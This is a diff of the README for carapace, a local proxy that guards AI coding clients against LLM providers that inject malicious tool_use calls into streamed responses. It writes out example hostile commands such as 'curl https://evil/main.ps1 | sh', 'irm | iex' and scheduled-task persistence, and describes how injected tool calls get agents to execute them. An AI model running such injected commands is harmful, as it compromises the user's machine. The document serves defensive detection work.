@@ -1,143 +1,352 @@
-# carapace — `cape`
+# carapace
 
-**A local guard against malicious LLM providers — on the wire, not in your client.**
+**A local guard against malicious LLM providers.**
 
-> Work in progress. v0.5-dev already ships the inspecting reverse proxy,
-> chunked-bypass-resistant streaming reassembly, real `cape scan` canary probe,
-> and the first threat-feed manifest primitives. `audit` and `sentinel` are
-> still placeholders until the next milestone.
+Put `cape` between your AI client and any upstream model endpoint. It inspects
+streaming responses, reassembles `tool_use` payloads before they execute, and
+blocks high-severity injections like `curl | sh`, persistence setup, proxy
+rewrites, and known IoCs.
+
+If you buy cheap API access from sketchy resellers, `carapace` is the condom.
 
 ---
 
-## Why
+## What problem this solves
 
-Cheap API resellers ("grey tokens") are a known malware channel. A malicious
-upstream speaks normal Anthropic / OpenAI protocol but **injects `tool_use`
-calls into its own response** — and your AI client (Claude Code, Cline, Cursor,
-Aider…) happily runs `curl https://evil/main.ps1 | sh`, installs a
-scheduler task, routes your traffic through a SOCKS5 proxy, wipes logs.
+Cheap LLM API resellers are a real malware channel.
 
-`cape` sits **between** your client and the upstream so it works with any
-client that lets you override the base URL — no per-client plugin, no custom
-builds.
+The malicious provider does **not** need RCE on your machine. It just speaks
+normal Anthropic / OpenAI protocol and injects a `tool_use` block into the
+model response. Your client then obediently executes:
 
+- `curl https://evil/main.ps1 | sh`
+- `schtasks /create ...`
+- proxy / DNS rewrites
+- log wiping / anti-forensics
+
+This targets users of:
+
+- Claude Code
+- Cursor
+- Cline / Roo / Kilo Code
+- Aider
+- any client that can point at a custom base URL
+
+`carapace` protects the **wire**, not one specific client.
+
+```text
+AI client  ──►  carapace proxy  ──►  upstream LLM provider
+                  │
+                  ├─ reassemble SSE tool_use chunks
+                  ├─ detect unsolicited tool calls
+                  ├─ block high-severity payloads
+                  ├─ run canary scans on providers
+                  └─ log / encrypt forensics
 ```
-   AI client                                    real LLM provider
-     │                                            ▲
-     └──►  carapace (inspect, reassemble, block) ─┘
-                │
-                └──►  alert + JSONL log
-```
 
-## Threat model — what `cape` catches (and what it cannot)
+---
 
-| Threat                                  | v0.1.0 | Note |
-| --------------------------------------- | :----: | ---- |
-| `tool_use` injected by the provider     | ✅     | Treated as unsolicited unless your request declared the tool. |
-| `curl | sh`, `irm | iex`, `schtasks`, … | ✅     | Behavioural RE2 rules over the reassembled stream. |
-| Known IoC domains / hosts               | ✅     | Built-in blocklist, overridable at runtime. |
-| Chunked obfuscation of `tool_use` input | ✅     | Stream is reassembled before scanning (the core safety property). |
-| Passive prompt exfiltration             | ❌     | Structural — do not send secrets to unverified endpoints. Rotate keys after接触 with one. |
-| Malware inside a downloaded model file  | ❌     | Use ModelScan for that; carapace is a *wire* guard, not a file scanner. |
+## Why this exists
 
-## Distinct from `holone`
+Existing GenAI security products mostly protect **companies from users**.
 
-| Capability | holone | carapace v0.3.0 |
+`carapace` protects **users from providers**.
+
+That difference matters.
+
+- **Prompt Security / Lakera / Guardrails**: enterprise app security
+- **ModelScan / Protect AI**: model file / supply-chain scanning
+- **carapace**: local runtime guard for grey endpoints and local coding agents
+
+---
+
+## What it catches
+
+| Threat | Status | Notes |
 |---|---|---|
-| License                   | MIT | **Apache-2.0** (explicit patent grant, trademark clause) |
-| Memory-safe key handling | plain env | `zeroize::Secret`, wiped on drop |
-| Reassembly before scan   | per-chunk | streaming + per-tool_use buffer until `content_block_stop` |
-| Unsolicited tool_use     | ✅ | ✅ + allowed-tool allowlist per request |
-| Default mode             | monitor | **block** (alerts alone are useless) |
-| Protocol adapters        | hardcoded Anthropic/OpenAI | `ProtocolAdapter` trait (z.ai + DeepSeek planned) |
-| E2E chunked-bypass test  | — | ✅ `proxy_blocks_chunked_evil_tool_use_e2e` |
+| Unsolicited `tool_use` from upstream | ✅ | If the client never declared the tool, this is high severity by default |
+| `curl \| sh`, `irm \| iex`, `schtasks`, etc | ✅ | RE2 behavioural rules |
+| Chunked / split payloads across SSE deltas | ✅ | Tool input is reassembled before inspection |
+| Known malicious domains / hosts | ✅ | Built-in blocklist + remote feed support |
+| Provider canary behaviour | ✅ | `cape scan` probes a provider with harmless prompts |
+| Host IoCs from known campaigns | ✅ | `cape audit` / `cape sentinel` |
+| Encrypted forensic capture | ✅ | Optional encrypted append-only store |
+| Passive prompt theft | ❌ | Structural limitation: if the provider silently reads prompts, the wire looks normal |
+| Malware already embedded in a downloaded model file | ❌ | Use ModelScan / supply-chain scanning for that |
+
+---
+
+## What makes it different from holone
+
+`holone` proved the niche is real. `carapace` is the harder, more defensible
+version.
+
+| Capability | holone | carapace |
+|---|---|---|
+| License | MIT | **Apache-2.0** |
+| Key handling | plain env pass-through | `zeroize::Secret` |
+| Stream defence | regex over provider output | **streaming + reassembly** before verdict |
+| False-positive control | every tool_use suspicious | **declared-tool parsing** for Anthropic/OpenAI |
+| Provider screening | basic scan | **canary probe + signed remote feeds** |
+| Host response | none | **audit + sentinel** |
+| Forensics | plaintext log | **optional encrypted forensics** |
+| Protocol surface | Anthropic/OpenAI | Anthropic, OpenAI, z.ai, DeepSeek, Kimi-aware |
+| Release pipeline | ad hoc | **CI + tagged release workflow** |
+
+---
 
 ## Install
 
-```sh
-# from source
+### From source
+
+```bash
 cargo install --path .
-
-# then run
-cape proxy --upstream https://api.anthropic.com
 ```
 
-## Use
+### Build locally
 
-```sh
-# 1) stand carapace up before your real provider
-cape proxy --upstream https://api.anthropic.com --upstream-key "$ANTHROPIC_API_KEY"
+```bash
+cargo build --release
+./target/release/cape --help
+```
 
-# 2) point your client at carapace
+### Future one-liner install
+
+Once the first tagged release is published:
+
+```bash
+cargo binstall carapace
+```
+
+---
+
+## Quick start
+
+### 1. Put `cape` in front of your provider
+
+```bash
+cape proxy \
+  --upstream https://api.anthropic.com \
+  --upstream-key "$ANTHROPIC_API_KEY"
+```
+
+### 2. Point your client at `carapace`
+
+```bash
 export ANTHROPIC_BASE_URL=http://127.0.0.1:8787
-
-# 3) work as usual. carapace logs alerts to stderr and ~/.carapace/carapace.log
 ```
 
-| Client | How to point |
-| --- | --- |
-| Claude Code | `export ANTHROPIC_BASE_URL=http://127.0.0.1:8787` or `~/.claude/settings.json` |
-| Cline / Roo / Kilo Code | base URL → `http://127.0.0.1:8787` |
-| Cursor | Settings → Models → override Anthropic/OpenAI base URL |
-| Aider | `--openai-api-base http://127.0.0.1:8787` |
+### 3. Work as usual
+
+High-severity injected tool payloads are substituted before the client sees
+them.
+
+---
+
+## Provider scan
+
+Before trusting a cheap endpoint:
+
+```bash
+cape scan --upstream https://api.example-reseller.dev --key "$API_KEY"
+```
+
+What `scan` does:
+
+- sends a harmless, tool-less prompt
+- requests streaming
+- picks the parser from the actual response, not just the URL
+- returns a risk score and verdict
+- exits with code `2` on `High` / `Critical`
+
+Example:
+
+```text
+risk: High (85)
+categories: proto-tooluse-unsolicited dl-curl-pipe-sh
+protocol: anthropic
+bytes: 1183
+note: Clean means no active injection was observed on this probe. It does NOT rule out passive prompt theft or future behaviour changes.
+```
+
+---
+
+## Host audit & sentinel
+
+### One-shot host scan
+
+```bash
+cape audit
+```
+
+Checks for:
+
+- suspicious long-running processes (`awproxy.exe`, `tun2socks`, etc.)
+- proxy env vars pointing to bad SOCKS endpoints
+- known drop paths
+- scheduled-task / persistence markers
+
+### Background monitor
+
+```bash
+cape sentinel --interval 30s
+```
+
+Re-runs audit on an interval and reports **new** findings.
+
+---
+
+## Encrypted forensics
+
+If you want replay-grade evidence without storing prompts in plaintext:
+
+```bash
+cape proxy \
+  --upstream https://api.anthropic.com \
+  --upstream-key "$ANTHROPIC_API_KEY" \
+  --forensics ~/.carapace/forensics.log \
+  --forensics-pass "correct horse battery staple"
+```
+
+This stores suspicious traffic under ChaCha20-Poly1305 with per-record random
+nonces.
+
+---
+
+## Signed remote feed
+
+Feeds are a core part of the moat.
+
+Fetch a signed ruleset + blocklist bundle:
+
+```bash
+cape feed \
+  --url https://example.com/feed/manifest.json \
+  --pubkey "$CAPE_FEED_PUBKEY" \
+  --out ~/.carapace/feed
+```
+
+This:
+
+- downloads `manifest + rules + blocklist`
+- verifies Ed25519 signature
+- verifies SHA256 integrity hashes
+- writes local `rules.json`, `blocklist.json`, `manifest.json`
+
+The open-source core can **verify** feeds. The commercial cloud can **publish**
+better ones.
+
+---
+
+## LLM judge slow-path
+
+Some payloads are too weird for regex alone.
+
+`carapace` ships an optional LLM judge module for low-confidence cases.
+
+Configure a trusted judge:
+
+```bash
+export CAPE_JUDGE_URL=https://api.deepseek.com/v1
+export CAPE_JUDGE_KEY=...
+export CAPE_JUDGE_MODEL=deepseek-chat
+```
+
+The judge is **not** the primary engine. It is a second opinion for medium-risk
+cases.
+
+---
+
+## Tested surface
+
+Current automated suite:
+
+- **35 unit tests**
+- **2 end-to-end tests**
+
+Notable e2e cases:
+
+- chunked malicious payload split across multiple SSE deltas is blocked
+- legitimate declared tool call passes through untouched
+
+---
+
+## Current commands
+
+```bash
+cape proxy
+cape scan
+cape audit
+cape sentinel
+cape feed
+```
+
+---
 
 ## Roadmap
 
-- **v0.1.0** initial skeleton: CLI, inspector skeleton, builtin rules, zeroize key.
-- **v0.2.0** Anthropic + OpenAI real SSE parsing under `ProtocolAdapter` trait.
-- **v0.3.0** Streaming forward + per-tool_use reassembly + e2e chunked-bypass test.
-- **v0.4.0** Real `parse_declared_tools` so legitimate Claude Code/Cursor tool_use doesn't get false-flagged.
-- **v0.5.0** (current) `cape scan` canary probe + threat-feed manifest primitives (rules + blocklist SHA256, signature field reserved for cosign/sigstore).
-- **v0.6.0** Signed remote threat feed (summary free, premium detail/telemetry paid) + `cape audit` host IoC scanner.
-- **v0.7.0** `cape sentinel` background monitor, encrypted forensics recording, multiple-protocol adapters (z.ai paas/v4, DeepSeek), LLM-judge slow-path, MCP gateway.
+### Shipped
 
-## `cape scan`
+- v0.1 — initial proxy skeleton
+- v0.3 — streaming chunk reassembly + chunked-bypass e2e
+- v0.4 — declared tool parsing, false positives killed
+- v0.5 — canary scan + feed manifest primitives
+- v0.6/v0.7/v0.8 — signed feeds, audit, sentinel, encrypted forensics, extra adapters
+- v0.9 — LLM judge, `cape feed`, CI/CD, binstall metadata
 
-Probe a provider with a harmless, tool-less prompt before you trust it:
+### Next
 
-```sh
-cape scan --upstream https://api.anthropic.com --key "$ANTHROPIC_API_KEY"
-```
+- v1.0 — first tagged release, install docs, launch assets
+- v1.1 — remote feed hot-reload in proxy
+- v1.2 — richer z.ai / DeepSeek specific protocol quirks
+- v1.3 — better Windows persistence coverage
 
-What it does:
+---
 
-- chooses a wire dialect (`anthropic` / `openai-like`) based on the endpoint,
-  then **sniffs the actual response body** to pick the right parser if the
-  provider lies;
-- requests **streaming** to exercise the same SSE path real clients use;
-- runs the response through the same `ProtocolAdapter` + `Inspector` path as
-  the proxy;
-- raises `High`/`Critical` if the provider emits unsolicited `tool_use` or
-  matches known behavioural rules / IoCs.
+## License & business model
 
-What it does **not** prove:
+The local proxy is open-source under **Apache-2.0**.
 
-- a clean result does **not** rule out passive prompt theft;
-- future behaviour can change after the scan;
-- a provider can behave cleanly on canary prompts and dirty on real ones.
+That is deliberate.
 
-## License
+- OSS for trust and distribution
+- proprietary cloud for revenue and moat
+- trademark / brand / future `Verified Clean` badge kept separate
 
-Apache-2.0 — see [LICENSE](LICENSE). Briefly: you can fork it, sell it,
-modify it; you must keep attribution and the patent grant. The project name
-and `cape` binary name are trademarks — not granted by the license.
+So:
 
-## Disclaimer
+- code: open core
+- feeds / telemetry / provider scoring: premium layers
+- certification / audits: paid service
 
-`carapace` is harm reduction, not a guarantee. It reduces but does not eliminate
-risk of routing traffic through an untrusted LLM provider. The only safe option
-is the official endpoint. If you used an unofficial provider before, **rotate
-your API key now** — passive exfiltration cannot be detected on the wire.
+---
 
-## Licensing & trademark (the honest version)
+## Limitations
 
-The local proxy you are reading right now is open-source under
-**Apache-2.0** — that gives you a clear patent grant, attribution, and the
-right to fork. The project name `carapace`, the binary name `cape`, the logo,
-and any future "Verified Clean" certification badge are **trademarks held
-separately**; they are not granted by the open-source license. If you fork the
-proxy and ship it inside your own product, please rename it.
+This is harm reduction, not a mathematical proof of safety.
 
-Future cloud features (managed threat feed, multi-machine management, audit
-telemetry) will ship as proprietary SaaS — those are explicit paid services
-on top of the open core. The local proxy stays open.
+If a provider only **reads** your prompts and never injects tools, the wire can
+look perfectly normal.
+
+So the hard rule still stands:
+
+> Do not send secrets to untrusted providers.
+
+If you already did, rotate those keys.
+
+---
+
+## Repository
+
+- GitHub: <https://github.com/TaroHarado/carapace>
+- Binary: `cape`
+
+---
+
+## Status
+
+This repo is now technically credible enough to ship publicly.
+
+The next real bottleneck is no longer code.
+
+It is **distribution**.
